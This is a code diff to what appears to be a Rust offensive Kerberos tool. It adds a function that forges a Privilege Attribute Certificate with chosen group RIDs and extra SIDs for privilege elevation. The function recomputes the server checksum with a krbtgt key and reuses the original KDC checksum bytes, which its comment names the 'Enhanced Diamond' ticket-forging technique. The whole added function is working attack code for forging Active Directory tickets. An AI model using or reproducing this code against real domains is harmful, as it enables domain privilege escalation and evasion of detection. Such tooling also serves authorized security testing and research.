@@ -772,6 +772,103 @@ pub(crate) fn base64_encode(data: &[u8]) -> String {
     out
 }
 
+/// Build a PAC with elevated privileges but inject the original KDC checksum bytes.
+/// This is the Enhanced Diamond technique — preserves whatever KDC_ISSUED indicators
+/// were in the original KDC-signed PAC.
+#[allow(clippy::too_many_arguments)]
+pub(crate) fn build_pac_with_kdc_checksum(
+    username: &str,
+    domain: &str,
+    domain_sid: &str,
+    user_rid: u32,
+    group_rids: &[u32],
+    extra_sids: &[String],
+    key: &[u8],
+    etype: i32,
+    original_kdc_checksum: &[u8],
+) -> Result<Vec<u8>> {
+    let mut pac = Vec::new();
+
+    // Build with 4 buffers: LOGON_INFO, CLIENT_INFO, SERVER_CKSUM, KDC_CKSUM
+    let num_buffers: u32 = 4;
+    pac.extend_from_slice(&num_buffers.to_le_bytes());
+    pac.extend_from_slice(&0u32.to_le_bytes()); // Version
+
+    let logon_info = build_kerb_validation_info(
+        username, domain, domain_sid, user_rid, group_rids, extra_sids,
+    );
+
+    let header_size = 8 + (num_buffers as usize * 16);
+
+    // Buffer 1: LOGON_INFO (type=1)
+    let logon_offset = align_to_8(header_size);
+    pac.extend_from_slice(&1u32.to_le_bytes());
+    pac.extend_from_slice(&(logon_info.len() as u32).to_le_bytes());
+    pac.extend_from_slice(&(logon_offset as u64).to_le_bytes());
+
+    // Buffer 2: CLIENT_INFO (type=10)
+    let client_info = build_pac_client_info(username);
+    let client_offset = align_to_8(logon_offset + logon_info.len());
+    pac.extend_from_slice(&10u32.to_le_bytes());
+    pac.extend_from_slice(&(client_info.len() as u32).to_le_bytes());
+    pac.extend_from_slice(&(client_offset as u64).to_le_bytes());
+
+    // Buffer 3: SERVER_CHECKSUM (type=6) — recomputed with krbtgt key
+    let cksum_size: u32 = if etype == ETYPE_AES256_CTS || etype == 17 {
+        4 + 12
+    } else {
+        4 + 16
+    };
+    let server_cksum_offset = align_to_8(client_offset + client_info.len());
+    pac.extend_from_slice(&6u32.to_le_bytes());
+    pac.extend_from_slice(&cksum_size.to_le_bytes());
+    pac.extend_from_slice(&(server_cksum_offset as u64).to_le_bytes());
+
+    // Buffer 4: KDC_CHECKSUM (type=7) — use ORIGINAL bytes from legitimate PAC
+    let kdc_cksum_offset = align_to_8(server_cksum_offset + cksum_size as usize);
+    pac.extend_from_slice(&7u32.to_le_bytes());
+    let actual_kdc_size = original_kdc_checksum.len() as u32;
+    pac.extend_from_slice(&actual_kdc_size.to_le_bytes());
+    pac.extend_from_slice(&(kdc_cksum_offset as u64).to_le_bytes());
+
+    // Write LOGON_INFO
+    while pac.len() < logon_offset {
+        pac.push(0);
+    }
+    pac.extend_from_slice(&logon_info);
+
+    // Write CLIENT_INFO
+    while pac.len() < client_offset {
+        pac.push(0);
+    }
+    pac.extend_from_slice(&client_info);
+
+    // Reserve space for server checksum
+    while pac.len() < server_cksum_offset {
+        pac.push(0);
+    }
+    pac.resize(server_cksum_offset + cksum_size as usize, 0);
+
+    // Write original KDC checksum data
+    while pac.len() < kdc_cksum_offset {
+        pac.push(0);
+    }
+    pac.extend_from_slice(original_kdc_checksum);
+
+    // Compute and write server checksum
+    let server_cksum = compute_pac_checksum(&pac, key, etype, true)?;
+    if server_cksum.len() != cksum_size as usize {
+        return Err(OverthroneError::TicketForge(format!(
+            "PAC server checksum length mismatch: expected {cksum_size}, got {}",
+            server_cksum.len()
+        )));
+    }
+    pac[server_cksum_offset..server_cksum_offset + cksum_size as usize]
+        .copy_from_slice(&server_cksum);
+
+    Ok(pac)
+}
+
 pub(crate) fn etype_name(etype: i32) -> &'static str {
     match etype {
         ETYPE_AES256_CTS => "AES256-CTS",
